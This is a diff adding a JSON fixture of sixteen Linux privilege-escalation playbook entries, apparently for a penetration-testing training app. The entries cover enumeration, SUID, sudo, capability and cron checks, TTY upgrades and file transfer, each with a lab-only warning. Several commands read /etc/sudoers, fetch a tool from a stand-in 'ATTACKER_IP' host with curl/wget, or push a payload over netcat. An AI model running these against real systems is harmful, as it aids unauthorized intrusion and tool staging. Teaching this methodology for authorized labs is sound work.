@@ -1,0 +1,291 @@
+[
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 1,
+    "fields": {
+      "title": "Enumeration - Identity and System Snapshot",
+      "slug": "linux-enum-identity-system-snapshot",
+      "platform": "linux",
+      "category": "enumeration",
+      "tags": "enumeration,identity,system",
+      "summary": "Collect user, kernel and host information for baseline context.",
+      "prerequisites": "Low-privilege shell in an authorized lab machine.",
+      "commands": "id\nwhoami\nuname -a\nhostname\ncat /etc/os-release",
+      "explanation": "These commands quickly identify privilege level, kernel version and distro information.",
+      "warnings": "Do not run on systems you do not own or have explicit permission to test.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 2,
+    "fields": {
+      "title": "Enumeration - Processes, Network and Mounted Filesystems",
+      "slug": "linux-enum-process-network-mounts",
+      "platform": "linux",
+      "category": "enumeration",
+      "tags": "enumeration,processes,network,mounts",
+      "summary": "Map running services and interesting filesystems.",
+      "prerequisites": "Basic shell access.",
+      "commands": "ps aux --sort=-%mem | head\nss -tulpn\nmount\nlsblk\ndf -h",
+      "explanation": "Useful for finding exposed services, writable mounts and suspicious daemons.",
+      "warnings": "Service visibility may be restricted by namespace/container boundaries.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 3,
+    "fields": {
+      "title": "SUID/SGID - Quick Discovery",
+      "slug": "linux-suid-sgid-quick-discovery",
+      "platform": "linux",
+      "category": "suid/sgid",
+      "tags": "suid,sgid,discovery",
+      "summary": "Locate SUID/SGID binaries outside default paths.",
+      "prerequisites": "Read access to filesystem paths.",
+      "commands": "find / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null",
+      "explanation": "High-value binaries can provide privilege escalation if misconfigured.",
+      "warnings": "Large filesystems can make these scans slow.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 4,
+    "fields": {
+      "title": "SUID/SGID - Prioritize GTFOBins Candidates",
+      "slug": "linux-suid-sgid-gtfobins-prioritize",
+      "platform": "linux",
+      "category": "suid/sgid",
+      "tags": "suid,gtfobins,triage",
+      "summary": "Filter discovered binaries against common escalation candidates.",
+      "prerequisites": "List of SUID binaries from previous step.",
+      "commands": "find / -perm -4000 -type f 2>/dev/null | egrep 'nmap|vim|find|bash|python|perl|cp|tar'",
+      "explanation": "Prioritization helps focus manual testing on binaries with known abuse paths.",
+      "warnings": "Presence alone does not guarantee exploitation success.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 5,
+    "fields": {
+      "title": "Sudo Abuse - List Privileges",
+      "slug": "linux-sudo-abuse-list-privileges",
+      "platform": "linux",
+      "category": "sudo abuse",
+      "tags": "sudo,enumeration",
+      "summary": "Inspect sudo rules available to the current user.",
+      "prerequisites": "User account with potential sudo permissions.",
+      "commands": "sudo -l",
+      "explanation": "The sudoers output reveals commands executable as root or other users.",
+      "warnings": "Repeated wrong password attempts may trigger lockouts or alerts.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 6,
+    "fields": {
+      "title": "Sudo Abuse - Environment and Path Checks",
+      "slug": "linux-sudo-abuse-env-path-checks",
+      "platform": "linux",
+      "category": "sudo abuse",
+      "tags": "sudo,env,path",
+      "summary": "Review sudo environment handling and potential path abuse vectors.",
+      "prerequisites": "Output from sudo -l.",
+      "commands": "sudo -l\nenv | sort\ncat /etc/sudoers 2>/dev/null\nls -la /etc/sudoers.d 2>/dev/null",
+      "explanation": "Misconfigured env_keep/secure_path values can introduce escalation opportunities.",
+      "warnings": "Reading sudoers files may require privileges.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 7,
+    "fields": {
+      "title": "Capabilities - Enumerate File Capabilities",
+      "slug": "linux-capabilities-enumerate-files",
+      "platform": "linux",
+      "category": "capabilities",
+      "tags": "capabilities,getcap",
+      "summary": "Find binaries with elevated Linux capabilities.",
+      "prerequisites": "Access to getcap binary.",
+      "commands": "getcap -r / 2>/dev/null",
+      "explanation": "Capabilities can grant privileged operations without full root SUID.",
+      "warnings": "Output may be extensive on large hosts.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 8,
+    "fields": {
+      "title": "Capabilities - Inspect Python/Perl Privileged Paths",
+      "slug": "linux-capabilities-python-perl-paths",
+      "platform": "linux",
+      "category": "capabilities",
+      "tags": "capabilities,python,perl",
+      "summary": "Check if interpreters expose dangerous capabilities.",
+      "prerequisites": "Capability listing already collected.",
+      "commands": "getcap -r / 2>/dev/null | egrep 'python|perl|ruby|node|php'",
+      "explanation": "Capability-enabled interpreters are often high-priority escalation vectors.",
+      "warnings": "Manual validation is required before any escalation attempt.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 9,
+    "fields": {
+      "title": "Cron Jobs - Enumerate System and User Tasks",
+      "slug": "linux-cron-enumerate-system-user-tasks",
+      "platform": "linux",
+      "category": "cron jobs",
+      "tags": "cron,scheduled,tasks",
+      "summary": "Inspect cron directories and crontabs for writable scripts.",
+      "prerequisites": "Filesystem read access.",
+      "commands": "cat /etc/crontab\nls -la /etc/cron.d\nls -la /etc/cron.daily\ncrontab -l",
+      "explanation": "Weak cron script permissions can enable command injection or script replacement.",
+      "warnings": "User crontab may be empty depending on account.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 10,
+    "fields": {
+      "title": "Cron Jobs - Writable Script Triage",
+      "slug": "linux-cron-writable-script-triage",
+      "platform": "linux",
+      "category": "cron jobs",
+      "tags": "cron,writable,triage",
+      "summary": "Find world/group writable scripts referenced by cron.",
+      "prerequisites": "Known cron script paths.",
+      "commands": "find /etc/cron* -type f -writable 2>/dev/null\nfind /var/spool/cron -type f -writable 2>/dev/null",
+      "explanation": "Writable scheduled scripts are critical findings in privilege escalation assessments.",
+      "warnings": "Do not modify files outside authorized lab scope.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 11,
+    "fields": {
+      "title": "Path Hijacking - PATH Variable Review",
+      "slug": "linux-path-hijacking-path-review",
+      "platform": "linux",
+      "category": "path hijacking",
+      "tags": "path,hijacking,environment",
+      "summary": "Check PATH ordering and writable directories in execution flow.",
+      "prerequisites": "Shell access with environment visibility.",
+      "commands": "echo $PATH\nfor p in $(echo $PATH | tr ':' ' '); do ls -ld $p; done",
+      "explanation": "Writable directories early in PATH can allow command shadowing.",
+      "warnings": "Containerized shells may not reflect host PATH policies.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 12,
+    "fields": {
+      "title": "Path Hijacking - Sudo Secure Path Analysis",
+      "slug": "linux-path-hijacking-sudo-secure-path-analysis",
+      "platform": "linux",
+      "category": "path hijacking",
+      "tags": "path,hijacking,sudo",
+      "summary": "Check secure_path and command calls without absolute paths.",
+      "prerequisites": "sudo -l access for current user.",
+      "commands": "sudo -l\ngrep -R 'secure_path' /etc/sudoers /etc/sudoers.d 2>/dev/null",
+      "explanation": "Misaligned secure_path and writable directories can lead to privilege escalation.",
+      "warnings": "sudoers file access may be restricted.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 13,
+    "fields": {
+      "title": "TTY Upgrade - Python PTY Spawn",
+      "slug": "linux-tty-upgrade-python-pty-spawn",
+      "platform": "linux",
+      "category": "tty upgrade",
+      "tags": "tty,python,pty",
+      "summary": "Upgrade non-interactive shell into a stable PTY session.",
+      "prerequisites": "Python available on target.",
+      "commands": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nstty rows 40 columns 120",
+      "explanation": "Improves usability for editors, su/sudo prompts, and signal handling.",
+      "warnings": "Terminal dimensions should match your local terminal.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 14,
+    "fields": {
+      "title": "TTY Upgrade - Script Utility Method",
+      "slug": "linux-tty-upgrade-script-utility-method",
+      "platform": "linux",
+      "category": "tty upgrade",
+      "tags": "tty,script,interactive",
+      "summary": "Use script command to improve interactive shell behavior.",
+      "prerequisites": "script utility present on target.",
+      "commands": "script -qc /bin/bash /dev/null\nreset\nexport SHELL=bash",
+      "explanation": "Alternative to Python when interpreters are unavailable.",
+      "warnings": "Some minimal systems do not include script utility.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 15,
+    "fields": {
+      "title": "File Transfer - Pull Files with Curl/Wget",
+      "slug": "linux-file-transfer-pull-with-curl-wget",
+      "platform": "linux",
+      "category": "file transfer",
+      "tags": "transfer,curl,wget,http",
+      "summary": "Transfer tools from controlled infrastructure to target host.",
+      "prerequisites": "Outbound HTTP allowed in lab network.",
+      "commands": "curl -O http://ATTACKER_IP/tool.bin\nwget http://ATTACKER_IP/tool.bin -O /tmp/tool.bin",
+      "explanation": "HTTP pull is often the simplest transfer method in lab environments.",
+      "warnings": "Replace ATTACKER_IP with your authorized lab host.",
+      "difficulty": "beginner",
+      "is_active": true
+    }
+  },
+  {
+    "model": "playbooks.playbookentry",
+    "pk": 16,
+    "fields": {
+      "title": "File Transfer - Push Files with Netcat",
+      "slug": "linux-file-transfer-push-with-netcat",
+      "platform": "linux",
+      "category": "file transfer",
+      "tags": "transfer,netcat,tcp",
+      "summary": "Send and receive files over a raw TCP channel in lab setups.",
+      "prerequisites": "Netcat available on both endpoints.",
+      "commands": "# Receiver\nnc -lvnp 9001 > received.bin\n# Sender\nnc TARGET_IP 9001 < payload.bin",
+      "explanation": "Useful fallback when HTTP tools are unavailable.",
+      "warnings": "Traffic is plaintext; use only in controlled labs.",
+      "difficulty": "intermediate",
+      "is_active": true
+    }
+  }
+]
+
